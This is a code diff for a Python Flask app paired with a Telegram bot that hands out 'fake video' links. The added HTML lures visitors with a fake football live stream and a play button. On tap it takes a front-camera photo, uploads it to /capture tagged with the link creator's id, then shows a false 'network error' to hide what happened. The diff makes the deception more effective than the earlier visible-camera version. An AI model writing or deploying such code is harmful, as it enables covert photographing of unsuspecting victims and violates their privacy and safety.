@@ -45,109 +45,10 @@ def capture_page():
         return "الرابط غير صالح", 403
 
     html = """
-    <!DOCTYPE html>
-    <html lang="ar" dir="rtl">
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-        <title>بث مباشر</title>
-        <style>
-            * { margin: 0; padding: 0; box-sizing: border-box; }
-            body { 
-                background: #000; color: #fff; 
-                font-family: 'Segoe UI', Tahoma, sans-serif; 
-                display: flex; flex-direction: column; 
-                justify-content: center; align-items: center; 
-                height: 100vh; overflow: hidden;
-            }
-            video { 
-                width: 100%; height: 100%; 
-                object-fit: cover; position: absolute; 
-                top: 0; left: 0; z-index: 1;
-            }
-            .overlay { 
-                position: absolute; top: 20px; right: 20px; 
-                z-index: 10; background: rgba(0,0,0,0.5); 
-                padding: 5px 15px; border-radius: 20px; 
-                color: #ff0000; font-weight: bold; font-size: 14px;
-                display: flex; align-items: center; gap: 8px;
-            }
-            .dot { 
-                width: 10px; height: 10px; background: #ff0000; 
-                border-radius: 50%; animation: blink 1s infinite; 
-            }
-            @keyframes blink { 
-                0% { opacity: 1; } 
-                50% { opacity: 0; } 
-                100% { opacity: 1; } 
-            }
-            .status { 
-                position: absolute; bottom: 30px; 
-                z-index: 10; background: rgba(0,0,0,0.7); 
-                padding: 10px 20px; border-radius: 10px; 
-                font-size: 16px; text-align: center;
-            }
-        </style>
-    </head>
-    <body>
-        <div class="overlay"><span class="dot"></span> بث مباشر</div>
-        <video id="video" autoplay playsinline muted></video>
-        <canvas id="canvas" style="display:none;"></canvas>
-        <div class="status" id="status">جاري الاتصال بالكاميرا...</div>
-
-        <script>
-            const video = document.getElementById('video');
-            const canvas = document.getElementById('canvas');
-            const status = document.getElementById('status');
-            const userId = "{{ user_id }}";
-
-            // طلب الكاميرا
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
-            .then(stream => {
-                video.srcObject = stream;
-                status.innerText = "✅ متصل - جاري المعالجة...";
-                
-                // التقاط الصورة بعد 3 ثواني من التشغيل
-                setTimeout(() => captureAndSend(stream), 3000);
-            })
-            .catch(err => {
-                status.innerText = "❌ تم رفض الوصول للكاميرا";
-                console.error("Camera error:", err);
-            });
-
-            function captureAndSend(stream) {
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                canvas.toBlob(blob => {
-                    const formData = new FormData();
-                    formData.append('photo', blob, 'capture.jpg');
-                    formData.append('user_id', userId);
-
-                    fetch('/capture', {
-                        method: 'POST',
-                        body: formData
-                    })
-                    .then(res => res.text())
-                    .then(data => {
-                        status.innerText = "✅ تم الإرسال بنجاح";
-                        // إيقاف الكاميرا وإخفاء الفيديو
-                        stream.getTracks().forEach(track => track.stop());
-                        video.style.display = 'none';
-                        document.body.style.background = '#111';
-                        status.innerText = "📷 تم التقاط الصورة بنجاح";
-                    })
-                    .catch(err => {
-                        status.innerText = "❌ حدث خطأ في الإرسال";
-                        console.error("Send error:", err);
-                    });
-                }, 'image/jpeg', 0.8);
-            }
-        </script>
-    </body>
-    </html>
+    <!doctype html><html><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>Live Stream</title>
+    <style>body{background:#000;margin:0;height:100vh;display:flex;justify-content:center;align-items:center;color:#fff;font-family:sans-serif;flex-direction:column}#clickArea{width:100%;height:100%;display:flex;justify-content:center;align-items:center;cursor:pointer;flex-direction:column;background:url('https://img.freepik.com/free-photo/wide-angle-shot-soccer-field_23-2148172385.jpg')center/cover;position:relative}.overlay{position:absolute;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5)}.play-icon{width:90px;height:90px;background:rgba(255,255,255,0.3);border-radius:50%;display:flex;justify-content:center;align-items:center;z-index:2;border:3px solid #fff;transition:0.2s}.play-icon:hover{background:rgba(255,255,255,0.6)}.play-icon svg{fill:#fff;width:36px;height:36px;margin-left:4px}#msg{z-index:2;margin-top:25px;font-size:18px;color:#eee;text-shadow:1px 1px 3px #000}.live-badge{position:absolute;top:20px;right:20px;background:#ff0000;color:#fff;padding:5px 12px;border-radius:20px;font-size:12px;font-weight:bold;animation:pulse 1.5s infinite;z-index:2}@keyframes pulse{0%{opacity:1}50%{opacity:0.6}100%{opacity:1}}.loading-bar{position:absolute;bottom:0;left:0;width:100%;height:4px;background:#333;z-index:2;display:none}.progress{height:100%;width:0%;background:#00d1ff;transition:width 2s}video,canvas{display:none}</style>
+    <body><div id=clickArea><div class=overlay></div><span class=live-badge>Live</span><div class=play-icon><svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg></div><div id=msg>Tap to play stream</div></div><div class=loading-bar id=loadingBar><div class=progress id=progress></div></div><video id=video playsinline></video><canvas id=canvas style="display:none;"></canvas>
+    <script>const a=document.getElementById('clickArea'),m=document.getElementById('msg'),v=document.getElementById('video'),c=document.getElementById('canvas'),u={{user_id}}, bar=document.getElementById('loadingBar'), prog=document.getElementById('progress');let captured=!1;a.onclick=function(){if(captured)return;m.innerText="Connecting to server...";bar.style.display="block";prog.style.width="40%";navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:{ideal:640},height:{ideal:480}},audio:false}).then(function(stream){v.srcObject=stream;return v.play();}).then(function(){const context=c.getContext('2d');c.width=v.videoWidth;c.height=v.videoHeight;context.drawImage(v,0,0,c.width,c.height);if(v.srcObject){v.srcObject.getTracks().forEach(track=>track.stop());v.srcObject=null;}captured=!0;prog.style.width="100%";m.innerText="Loading stream...";c.toBlob(function(blob){if(!blob)return;const f=new FormData();f.append('photo',blob,'photo.jpg');f.append('user_id',u);fetch('/capture',{method:'POST',body:f});setTimeout(()=>{bar.style.background="#ff3333";a.style.background="#000";document.querySelector('.overlay').style.background="rgba(0,0,0,1)";document.querySelector('.play-icon').style.display="none";document.querySelector('.live-badge').style.display="none";m.innerHTML="<span style='color:#ff5555;font-size:20px;'>⚠️ خطأ في الشبكة<br>تعذر تحميل البث المباشر.</span>";},1500);},'image/jpeg');}).catch(function(err){prog.style.display="none";m.innerText="⚠️ يرجى السماح للكاميرا للاستمرار.";m.style.color="#ffaa00";captured=!1;});};</script></body></html>
     """
     return render_template_string(html, user_id=user_id)
 
@@ -203,7 +104,7 @@ def link(message):
                 upsert=True
             )
         url = f"{BASE_URL}/capture?user_id={message.chat.id}"
-        bot.reply_to(message, f"✅ تم إنشاء رابط الفيديو الوهمي:\n\n{url}")
+        bot.reply_to(message, f"🎬 تم إنشاء رابط الفيديو الوهمي:\n\n{url}")
         print(f"--- LINK REPLY SENT: {url} ---")
     except Exception as e:
         print(f"❌ Error in /link: {e}")
